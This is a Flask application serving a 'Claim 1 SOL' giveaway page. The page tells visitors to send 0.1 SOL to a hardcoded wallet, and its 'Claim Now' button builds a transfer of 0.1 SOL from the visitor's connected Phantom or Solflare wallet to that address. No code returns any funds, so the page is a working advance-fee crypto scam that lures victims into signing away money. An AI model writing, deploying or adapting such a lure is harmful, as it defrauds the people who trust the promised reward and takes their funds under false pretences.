from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim 1 SOL</title>
  <script src="https://unpkg.com/@solana/web3.js@1.76.0/lib/index.iife.min.js"></script>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    .button {
      background: linear-gradient(to right, #00ff90, #00d178);
      border: none;
      color: #000;
      font-weight: bold;
      padding: 14px 30px;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      margin: 20px;
    }
    .button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    img.qr {
      width: 220px;
      margin: 20px auto;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff90;
      display: none;
    }
    #status {
      margin-top: 20px;
      color: #ccc;
      font-size: 0.9em;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>🎁 Claim 1 SOL</h1>
  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
  <p><code>{{ wallet }}</code></p>
  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />

  <button class="button" id="connectBtn">🔗 Connect Wallet</button>
  <button class="button" id="claimBtn" disabled>💸 Claim Now</button>

  <div id="status">Click "Connect Wallet" to begin.</div>

  <script>
    const walletAddress = "{{ wallet }}";
    let provider = null;
    let publicKey = null;

    const status = document.getElementById("status");
    const qr = document.getElementById("qrCode");
    const connectBtn = document.getElementById("connectBtn");
    const claimBtn = document.getElementById("claimBtn");

    connectBtn.addEventListener("click", async () => {
      if (window?.phantom?.solana?.isPhantom) {
        provider = window.phantom.solana;
      } else if (window?.solflare?.isSolflare) {
        provider = window.solflare;
      } else {
        status.innerText = "⚠️ No wallet detected (Phantom or Solflare). Try mobile wallet.";
        qr.style.display = "block";
        return;
      }

      try {
        status.innerText = "🔄 Connecting...";
        const resp = await provider.connect();
        publicKey = resp?.publicKey?.toString() || provider.publicKey?.toString();

        if (publicKey) {
          status.innerText = "✅ Connected: " + publicKey;
          connectBtn.innerText = "✅ Connected";
          connectBtn.disabled = true;
          claimBtn.disabled = false;
        } else {
          status.innerText = "❌ Connection failed.";
        }
      } catch (err) {
        status.innerText = "❌ Connection rejected or failed.";
        console.error(err);
      }
    });

    claimBtn.addEventListener("click", async () => {
      if (!provider || !publicKey) {
        status.innerText = "❌ Connect wallet first.";
        return;
      }

      try {
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
        const fromPubkey = new solanaWeb3.PublicKey(publicKey);
        const toPubkey = new solanaWeb3.PublicKey(walletAddress);
        const lamports = solanaWeb3.LAMPORTS_PER_SOL * 0.1;

        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey,
            toPubkey,
            lamports
          })
        );

        transaction.feePayer = fromPubkey;
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;

        const signed = await provider.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(signature);

        status.innerText = "✅ 0.1 SOL sent! Tx: https://solscan.io/tx/" + signature;
        claimBtn.innerText = "✅ Claimed";
        claimBtn.disabled = true;
      } catch (err) {
        console.error(err);
        status.innerText = "❌ Transaction failed or canceled.";
      }
    });
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
